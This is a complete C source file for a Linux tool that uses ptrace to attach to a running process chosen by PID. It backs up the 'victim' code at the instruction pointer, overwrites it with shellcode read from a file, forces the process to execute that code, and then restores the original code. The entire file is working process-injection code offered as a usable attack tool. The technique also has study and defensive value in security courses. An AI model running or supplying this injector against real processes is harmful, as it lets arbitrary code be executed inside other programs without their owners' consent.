#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/user.h>


#define SUCC                    (0)
#define FAIL                    (1)
#define SIZE_BLAH_BUF           (1024)
#define SIZE_PTRACE_WORD        (8)
#define ERROR_RETURN(pid)       do {                                            \
                                    printf("Error: %s\n", strerror(errno));     \
                                    ptrace(PTRACE_DETACH, pid, NULL, NULL);     \
                                    return FAIL;                                \
                                } while (0);


typedef union _WORD {
    long m_word_full;
    char m_word_part[SIZE_PTRACE_WORD];
} WORD;


int read_victim_code(pid_t pid, void *addr_rip, char *code, int len_code)
{
    WORD word;
    int iter, count_word = len_code / SIZE_PTRACE_WORD;
    for (iter = 0 ; iter < count_word ; ++iter) {
        int ofst = iter * SIZE_PTRACE_WORD;
        long rc = ptrace(PTRACE_PEEKDATA, pid, addr_rip + ofst, NULL);
        if (rc < 0)
            ERROR_RETURN(pid);
        word.m_word_full = rc;
        memcpy(code + ofst, word.m_word_part, SIZE_PTRACE_WORD);
    }

    return SUCC;
}


int write_victim_code(pid_t pid, void *addr_rip, char *code, int len_code)
{
    WORD word;
    int iter, count_word = len_code / SIZE_PTRACE_WORD;
    for (iter = 0 ; iter < count_word ; ++iter) {
        int ofst = iter * SIZE_PTRACE_WORD;
        memcpy(word.m_word_part, code + ofst, SIZE_PTRACE_WORD);
        if (ptrace(PTRACE_POKEDATA, pid, addr_rip + ofst, word.m_word_full) < 0)
            ERROR_RETURN(pid);
    }

    return SUCC;
}


int load_shell_code(char *path_code_file, char *shell_code, int *p_len_code)
{
    int fd_code = open(path_code_file, O_RDONLY);
    if (fd_code == -1)
        return FAIL;

    int len_code = read(fd_code, shell_code, SIZE_BLAH_BUF);
    if (len_code == 0)
        return FAIL;

    div_t count_word = div(len_code, SIZE_PTRACE_WORD);
    int iter, patch = SIZE_PTRACE_WORD - count_word.rem;
    for (iter = 0 ; iter < patch ; ++iter)
        shell_code[len_code + iter] = 0x90;

    close(fd_code);
    *p_len_code = len_code + patch;
    return SUCC;
}


int main(int argc, char **argv)
{
    if (argc != 3) {
        printf("Usage: ./inject_pure_code VICTIM_PID PATH_TO_CODE_FILE\n");
        return 0;
    }

    char shell_code[SIZE_BLAH_BUF];
    int len_code;
    printf("Load the shell code.\n");
    if (load_shell_code(argv[2], shell_code, &len_code) != SUCC)
        return FAIL;

    /* Attach to the victim process. */
    printf("Attach to the victim process.\n");
    pid_t victim_pid = atoi(argv[1]);
    if (ptrace(PTRACE_ATTACH, victim_pid, NULL, NULL) < 0)
        ERROR_RETURN(victim_pid);
    wait(NULL);

    printf("Backup the victim context.\n");
    /* Get the register file of the victim. */
    struct user_regs_struct regs;
    if(ptrace(PTRACE_GETREGS, victim_pid, NULL, &regs) < 0)
        ERROR_RETURN(victim_pid);

    /* Backup the victim code. */
    char victim_code[SIZE_BLAH_BUF];
    if (read_victim_code(victim_pid, (void*)regs.rip, victim_code, len_code) != SUCC)
        return FAIL;

    /* Inject the shell code. */
    printf("Inject the shell code.\n");
    if (write_victim_code(victim_pid, (void*)regs.rip, shell_code, len_code) != SUCC)
        return FAIL;

    /* Force the victim to execute the shell code. */
    printf("Force the victim to execute the shell code.\n");
    if (ptrace(PTRACE_SETREGS, victim_pid, NULL, &regs) < 0)
        ERROR_RETURN(victim_pid);
    if (ptrace(PTRACE_CONT, victim_pid, NULL, NULL) < 0)
        ERROR_RETURN(victim_pid);

    /* Wait for the software interrupt fired by the shell code. */
    wait(NULL);

    /* Restore the victim status. */
    printf("Mission Complete! Restore the status of the victim.\n");
    if (write_victim_code(victim_pid, (void*)regs.rip, victim_code, len_code) != SUCC)
        return FAIL;
    if (ptrace(PTRACE_SETREGS, victim_pid, NULL, &regs) < 0)
        ERROR_RETURN(victim_pid);
    if (ptrace(PTRACE_DETACH, victim_pid, NULL, NULL) < 0)
        ERROR_RETURN(victim_pid);

    return SUCC;
}
